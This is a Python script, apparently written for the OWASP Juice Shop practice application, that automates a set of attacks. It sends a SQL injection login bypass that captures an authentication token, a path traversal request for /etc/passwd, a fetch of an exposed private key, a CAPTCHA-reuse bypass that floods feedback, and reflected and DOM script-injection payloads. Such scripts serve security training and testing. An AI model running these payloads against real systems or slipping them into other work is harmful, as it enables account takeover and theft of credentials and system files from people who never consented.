import requests
import logging


class JuiceShopVulnerabilities:
    def __init__(self, base_url):
        self.base_url = base_url
        self.endpoints = {
            "feedback": "/api/Feedbacks",
            "captcha": "/rest/captcha/",
            "private_key": "/assets/private-key.pem",
        }

    def get_captcha(self):
        """Retrieve CAPTCHA data."""
        response = requests.get(self.base_url + self.endpoints["captcha"])
        if response.status_code == 200:
            try:
                return response.json()
            except (KeyError, ValueError):
                logging.error("Failed to parse CAPTCHA response.")
        return None
    
    def get_feedbacks(self):
        """Retrieve all feedbacks from the Juice Shop."""
        response = requests.get(self.base_url + self.endpoints["feedback"])
        if response.status_code == 200:
            try:
                feedbacks = response.json()["data"]
                logging.info(f"[+] Retrieved {len(feedbacks)} feedbacks.")
                return {"status": "success", "feedbacks": feedbacks}
            except KeyError:
                logging.error("Failed to parse feedback response.")
                return {"status": "failed", "details": "Invalid feedback data format."}
        else:
            logging.warning("[-] Failed to retrieve feedbacks.")
            return {"status": "failed", "details": response.text}

    def test_sql_injection(self):
        """Perform SQL Injection test."""
        payload = "' OR 1=1 --"
        data = {"email": payload, "password": "password"}

        response = requests.post(self.base_url + "/rest/user/login", json=data)
        if response.status_code == 200:
            try:
                details = response.json()
                email = details.get("email", "Unknown email")
                token = details.get("authentication", {}).get("token", "No token")
                logging.info(f"[+] SQL Injection succeeded. Email: {email}, Token: {token}")
                return {"status": "success", "details": {"email": email, "token": token}}
            except (KeyError, ValueError):
                logging.error("[!] Failed to parse server response during SQL Injection.")
                return {"status": "failed", "details": "Invalid response format."}
        else:
            logging.warning("[-] SQL Injection failed.")
            return {"status": "failed", "details": response.text}

    def test_captcha_bypass(self):
        """Bypass CAPTCHA by reusing valid CAPTCHA data."""
        captcha_data = self.get_captcha()
        if not captcha_data:
            return {"status": "failed", "details": "CAPTCHA retrieval failed."}

        data = {
            "comment": "This is a test bypass",
            "rating": 1,
            "author": "Attacker",
            "captchaId": captcha_data["captchaId"],
            "captcha": captcha_data["answer"],
        }

        results = []
        for i in range(5):
            response = requests.post(self.base_url + self.endpoints["feedback"], json=data)
            if response.status_code == 201:
                try:
                    feedback_id = response.json().get("data", {}).get("id", "Unknown ID")
                    logging.info(f"[+] CAPTCHA Bypass succeeded. Feedback ID: {feedback_id}")
                    results.append({"status": "success", "feedback_id": feedback_id})
                except (KeyError, ValueError):
                    results.append({"status": "success", "details": "Feedback submitted but no ID returned."})
            else:
                logging.warning(f"[-] CAPTCHA Bypass failed on request {i + 1}.")
                results.append({"status": "failed", "details": response.text})

        return {"status": "success" if any(r['status'] == "success" for r in results) else "failed", "details": results}

    def test_path_traversal(self):
        """Perform Path Traversal attack."""
        payload = "../../../../etc/passwd"
        response = requests.get(self.base_url + f"/ftp/{payload}")
        if response.status_code == 200 and "root:" in response.text:
            logging.info("[+] Path Traversal succeeded. Retrieved sensitive file content.")
            return {"status": "success", "details": {"file_content": response.text}}
        else:
            logging.warning("[-] Path Traversal attack failed.")
            return {"status": "failed", "details": "No sensitive files accessed."}

    def test_sensitive_data_exposure(self):
        """Test Sensitive Data Exposure."""
        response = requests.get(self.base_url + self.endpoints["private_key"])
        if response.status_code == 200:
            logging.info("[+] Sensitive Data Exposure attack succeeded. Retrieved private key.")
            return {"status": "success", "details": {"private_key": response.text}}
        else:
            logging.warning("[-] Sensitive Data Exposure attack failed.")
            return {"status": "failed", "details": response.text}

    def test_reflected_xss(self):
        """Test Reflected XSS attack."""
        payload = '<script>alert("xss")</script>'
        data = {"search": payload}

        response = requests.post(self.base_url + "/rest/products/search", json=data)
        if payload in response.text:
            logging.info("[+] Reflected XSS succeeded. Payload reflected in response.")
            return {"status": "success", "details": {"payload": payload}}
        else:
            logging.warning("[-] Reflected XSS failed.")
            return {"status": "failed", "details": "Payload not reflected in response."}

    def test_dom_xss(self):
        """Test DOM-based XSS attack."""
        payload = "<script>alert('dom_xss')</script>"
        response = requests.get(self.base_url + f"/#/?search={payload}")
        if payload in response.text:
            logging.info("[+] DOM XSS succeeded. Payload reflected in DOM.")
            return {"status": "success", "details": {"payload": payload}}
        else:
            logging.warning("[-] DOM XSS failed.")
            return {"status": "failed", "details": "Payload not reflected in DOM."}

    def run_all_attacks(self):
        """Run all attacks and return their results."""
        results = {
            "SQL Injection": self.test_sql_injection(),
            "CAPTCHA Bypass": self.test_captcha_bypass(),
            "Path Traversal": self.test_path_traversal(),
            "Sensitive Data Exposure": self.test_sensitive_data_exposure(),
            "Reflected XSS": self.test_reflected_xss(),
            "DOM XSS": self.test_dom_xss(),
        }
        return results
    
    
